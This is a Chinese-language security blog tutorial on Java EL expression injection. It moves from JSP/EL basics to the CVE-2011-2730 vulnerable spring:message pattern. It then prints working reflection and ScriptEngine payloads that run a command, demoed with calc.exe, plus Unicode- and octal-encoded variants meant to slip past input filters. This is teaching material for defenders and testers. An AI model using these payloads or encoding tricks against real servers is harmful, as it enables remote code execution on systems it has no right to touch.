#  el表达式注入漏洞   
原创 White_Room  寒鹭网络安全团队   2024-04-14 15:30  
  
**点击蓝字**  
  
  
**关注我们**  
  
el表达式注入漏洞  
  
**0x00前言**  
  
  EL表达式在开发的时候学过，跟jsp一起学的当时那没有了解到后续的漏洞利用，但是现在转念一想也确实可以直接java代码那java的利用方式不在这个语法中也可以使用嘛，然后学的时候也没有特别的仔细去扣细节  
  
  
**0x01概述**  
  
  EL（全称**Expression Language**）表达式语言。  
  
  作用：在jsp中可以写java的语法  
  
  获取域环境中获取数据，然后在前段展示就是前后端展示，  
  
**使用方法：**  
  
  首先要通过page设置不可用忽略EL表达式  
```
 <%@ page contentType="text/html;charset=UTF-8" language="java" isELIgnored="false" %>
```  
  
  语法格式：${expression(表达式)}  
  
  回顾一下以前的知识，有四个域  
  
        **·page：**当前页面有  
  
        **·request：**当前请求有效  
  
        **·session：**当前会话有效  
  
        **·application：**当前应用有效  
  
  比如说我们在做一个操作就是  
```
request.setAttribute(id,id);
setAttribute(String var1, Object var2);
```  
  
  这就是把它存到域，然后用对象id来可以取出来，都是存到域中那么会从那个域去取了，还是有什么标志去标记，还是说遍历循环的取，如果说是遍历循环去取的话又是什么样的顺序呢，答案是：  
  
el 表达式获取数据，会依次从这 4 个域中寻找，直到找到为止。而这四个域对象的作用范围如下图所示。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2RJibQNIqatSRU9eUvUDRibdXA7iatNMT7icugqZiaSibibd6Ymzz2icp3SpGveMlTwdgZ56A8LILgz0xSx5UZ3jiafhKMw/640?wx_fmt=png&from=appmsg "")  
  
  
  
  获取的顺序是先从page里面找然后没找到然后再从request里面找这样依次往上找最后找到application，这里说得也有点意思，双亲委派里面也有一个加载器叫applicationloader  
  
  
**0x02用法**  
  
  要使用 EL 表达式来获取数据，需要按照顺序完成以下几个步骤。  
  
        **·**获取到数据，比如从数据库中拿到数据  
  
        **·**将数据存储到 request 域中  
  
        **·**转发到对应的 jsp 文件中  
  
  实现的方法就是那么简单我们做一个简单的demo，随便写一个实体类叫People  
```
@WebServlet("/demo2")
public class ELDemo extends HttpServlet {
    public ELDemo() {
        super();
    }

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        List<People> peoples = new ArrayList<People>();
        peoples.add(new People("小明",2,"510"));
        peoples.add(new People("小明2",22,"5101"));
        peoples.add(new People("小明2",222,"51011"));
        req.setAttribute("peoples",peoples);
        //转发一下请求，不转发的话是拿不到数据的
        req.getRequestDispatcher("EL_demo.jsp").forward(req,resp);
    }


    @Override
    protected long getLastModified(HttpServletRequest req) {
        return super.getLastModified(req);
    }

    @Override
    public void destroy() {
        super.destroy();
    }
}


```  
  
```
<%@ page contentType="text/html;charset=UTF-8" language="java" isELIgnored="false" %>
<html>
<head>
    <title>Title</title>

</head>
<body>
${peoples}
</body>
</html>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2RJibQNIqatSRU9eUvUDRibdXA7iatNMT7icyVgeJEibwhy1YORNNKqRYCzfAYF0TIXSNIFVbLXwKn78dfTyCuFhZHg/640?wx_fmt=png&from=appmsg "")  
  
  
  
  访问demo2就看到数据了，还有一些开发的小知识就简单快速的总结一下  
  
****  
**0x03开发知识补充**  
  
  取值的时候的四大对象  
```
四大域  域在EL中的名称
Page  PageScope
Request  RequestScope
Session  SessionScope
Application  ApplicationScope
```  
```
param：将请求参数名称映射到单个字符串参数值（通过调用 ServletRequest.getParameter (String name) 获得）。getParameter (String) 方法返回带有特定名称的参数。表达式${param . name}相当于 request.getParameter (name)。
paramValues：将请求参数名称映射到一个数值数组（通过调用 ServletRequest.getParameter (String name) 获得）。它与 param 隐式对象非常类似，但它检索一个字符串数组而不是单个值。表达式 ${paramvalues. name} 相当于 request.getParamterValues(name)。
header：将请求头名称映射到单个字符串头值（通过调用 ServletRequest.getHeader(String name) 获得）。表达式 ${header. name} 相当于 request.getHeader(name)。
headerValues  将请求头名称映射到一个数值数组（通过调用 ServletRequest.getHeaders(String) 获得）。它与头隐式对象非常类似。表达式${headerValues. name}相当于 request.getHeaderValues(name)。
cookie：将 cookie 名称映射到单个 cookie 对象。向服务器发出的客户端请求可以获得一个或多个 cookie。表达式${cookie. name .value}返回带有特定名称的第一个 cookie 值。如果请求包含多个同名的 cookie，则应该使用${headerValues. name}表达式。
initParam：  将上下文初始化参数名称映射到单个值（通过调用 ServletContext.getInitparameter(String name) 获得）。
```  
  
**pageContext 对象**  
  
  pageContext 对象是 JSP 中 pageContext 对象的引用。通过 pageContext 对象，您可以访问 request 对象。比如，访问 request 对象传入的查询字符串，简单来说就是去获取传参  
```
${pageContext.request.queryString}
```  
  
我们访问  
  
http://localhost:8080/ELdemo_war_exploded/EL_demo.jsp?name=bearbar  
  
返回的值就是 name=bearbar  
  
**Scope 对象**  
  
  这个就很简单了就是获取对象的域对象，就是我们存的值是存在那个域对象里面就跟类的引用属性相似，例子：  
  
我们存入对象 request.setAttribute("name","bearbar");，获取的它的方式就是${requestScope.name}  
  
**param 和 paramValues 对象**  
  
  param 和 paramValues 对象用来访问参数值，通过使用 request.getParameter 方法和 request.getParameterValues 方法，这个方法就是很常用的方法了，也是获取传参值，它是以键值对的情况获取我们传参username=bearbar然后获取的时候${param.username},两者区别：param 对象返回单一的字符串，而 paramValues 对象则返回一个字符串数组。  
  
**header 和 headerValues 对象**  
  
  header 和 headerValues 对象用来访问信息头，通过使用 request.getHeader() 方法和 request.getHeaders() 方法。  
  
  举例来说，要访问一个名为 user-agent 的信息头，可以这样使用表达式：${header.user-agent}，或者 ${header["user-agent"]}，就是简单的获取http头的信息  
  
  
**0x04EL表达式漏洞**  
  
  看看实际的漏洞来看，都是已一些比较老的漏洞  
  
**CVE-2011-2730**  
  
  看一个通用payload  
```
${pageContext.setAttribute("a","".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"calc.exe"))
```  
  
这个就是一个简单的调用流程看一下实际情况中存在的spring的标签  
```
<spring:message text=
"${/"/".getClass().forName(/"java.lang.Runtime/").getMethod(/"getRuntime/",null).invoke(null,null).exec(/"calc/",null).toString()}">
</spring:message>
```  
```
<%@ taglib uri="http://www.springframework.org/tags" prefix="spring"%>
<spring:message  text="${param.a}"></spring:message>
```  
  
我们只需访问存在上面这个语句的jsp文件然后，传入参数就行  
  
http://localhost/test.jsp?a=${payloadbyel}  
  
这里就相当于执行了我们${payloadbyel}里面的语句  
  
这个漏洞的利用方式就是传入内部的el表达式是可控的然后内部会执行el表达啥从而导致的注入  
  
****  
**0x05基础bypass**  
  
**利用ScriptEngine调用JS引擎绕过**  
```
${''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('calc')")}
```  
  
**利用Unicode编码绕过**  
  
  部分编码或者全部编码都可以  
```
// Unicode编码内容为前面反射调用的PoC
\u0024\u007b\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0065\u0078\u0065\u0063\u0027\u002c\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u006e\u0075\u006c\u006c\u0029\u002c\u0027\u0063\u0061\u006c\u0063\u002e\u0065\u0078\u0065\u0027\u0029\u007d
```  
  
**利用八进制编码绕过**  
```
// 八进制编码内容为前面反射调用的PoC
\44\173\47\47\56\147\145\164\103\154\141\163\163\50\51\56\146\157\162\116\141\155\145\50\47\152\141\166\141\56\154\141\156\147\56\122\165\156\164\151\155\145\47\51\56\147\145\164\115\145\164\150\157\144\50\47\145\170\145\143\47\54\47\47\56\147\145\164\103\154\141\163\163\50\51\51\56\151\156\166\157\153\145\50\47\47\56\147\145\164\103\154\141\163\163\50\51\56\146\157\162\116\141\155\145\50\47\152\141\166\141\56\154\141\156\147\56\122\165\156\164\151\155\145\47\51\56\147\145\164\115\145\164\150\157\144\50\47\147\145\164\122\165\156\164\151\155\145\47\51\56\151\156\166\157\153\145\50\156\165\154\154\51\54\47\143\141\154\143\56\145\170\145\47\51\175
 
```  
  
  后续的这些编码绕过其实就是避免明文的过滤有很多类型就不举例了  
  
****  
**0x06小结**  
  
  EL注入的话原理很简单，需要利用的话主要是需要清楚el语法的写法和一些常规的bypass的手段，后续还有spel表达式注入漏洞等  
  
**参考：**  
  
EL表达式注入 – JohnFrod's Blog  
  
Java 之 EL 表达式注入 | 芜风 (drun1baby.github.io)  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/2RJibQNIqatRJWx9iadpWbjn2yEItXA84DsH8LK8IFtPTfOjlFoYLT7x9omh7JlF81oCLxIGGSwIzzUvvmroUcHA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
**扫码关注我们**  
  
  
   
微信号：hanlu_security  
  
 QQ交流群：553897268  
  
  
